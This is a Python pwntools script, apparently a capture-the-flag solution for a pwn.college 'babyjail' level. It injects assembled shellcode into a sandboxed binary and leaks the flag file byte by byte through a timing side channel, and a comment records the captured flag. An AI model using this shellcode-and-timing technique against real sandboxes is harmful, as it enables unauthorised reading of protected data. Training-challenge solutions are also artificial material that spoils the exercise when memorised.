import pwn
from time import time

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

# the fancy progress bars
iteration_progress = pwn.log.progress("PROGRESS")
flag_progress = pwn.log.progress("FLAG")

challenge_binary = "/challenge/babyjail_level12"
flag = str()

# the flag was pwn.college{MnBcc_SVN0gy-HLzZ2I2GoUZ13B.QXyQjMsYDMwQzW}

# 55 is the number of chars in flag
for i in range(50, 55):
    # loop through the ASCII range
    for b in range(33, 126):
        iteration_progress.status(f"Iteration {i}, Byte {b}")

        start = time()

        with pwn.process([challenge_binary, "/flag"], level = "CRITICAL", alarm=1) as target:
            target.send(pwn.asm(f"""
            sub rsp, 0x1000
            { pwn.shellcraft.read(3, "rsp", i) }
            { pwn.shellcraft.read(3, "rsp", 1) }
            xor eax, eax
            mov al, byte ptr [rsp]

            cmp rax, {b}
            jne crash
            jmp loop

            loop:
                { pwn.shellcraft.infloop() }

            crash:
                ret
            """
            ))

            target.poll(True)

        end = time()

        if end - start > 1:
            flag += chr(b)
            flag_progress.status( flag )
            break
